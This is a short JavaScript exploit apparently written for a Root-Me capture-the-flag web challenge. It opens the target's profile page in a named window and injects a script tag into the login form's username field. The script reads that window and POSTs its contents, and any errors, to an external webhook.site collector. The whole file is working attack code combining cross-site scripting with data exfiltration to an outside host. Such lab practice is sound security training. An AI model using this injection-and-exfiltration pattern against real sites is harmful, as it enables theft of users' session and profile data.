const ORIGIN = "https://tim-xd.github.io/web-client/index.html";
const LOGIN = "http://challenge01.root-me.org:58003/login";
const PROFILE = "http://challenge01.root-me.org:58003/profile";
const WEBHOOK = "https://webhook.site/091a3c43-0429-4c3c-a39d-3ea6b1045ce0";
const OPEN = "rootme";

function get(url) {
  let xhr = new XMLHttpRequest();
  xhr.open("GET", url, false);
  return xhr.send(null);
}

function post(url, data) {
  let xhr = new XMLHttpRequest();
  xhr.open("POST", url, false);
  return xhr.send(data);
}

function imgEnd() {
  const o = window.open(PROFILE, "toto");
  post(`${WEBHOOK}?end`, o);
  // document.location.href = WEBHOOK;
}

// const queryString = window.location.search;
// const urlParams = new URLSearchParams(queryString);
// const id = urlParams.get("id");

try {
  window.open(PROFILE, OPEN);

  const payload = `
try {
  const profile = window.open("", "${OPEN}");
  let xhr = new XMLHttpRequest();
  xhr.open("POST", "${WEBHOOK}", false);
  xhr.send(profile);
} catch (error) {
  let xhr = new XMLHttpRequest();
  xhr.open("POST", "${WEBHOOK}", false);
  xhr.send(error);
}
`;
  document.getElementById("username").value = `<script>${payload}</script>`;
  document.getElementById("login").submit();

  setTimeout(() => imgEnd(), 3000);
} catch (error) {
  post(WEBHOOK, `Error: ${error}`);
}
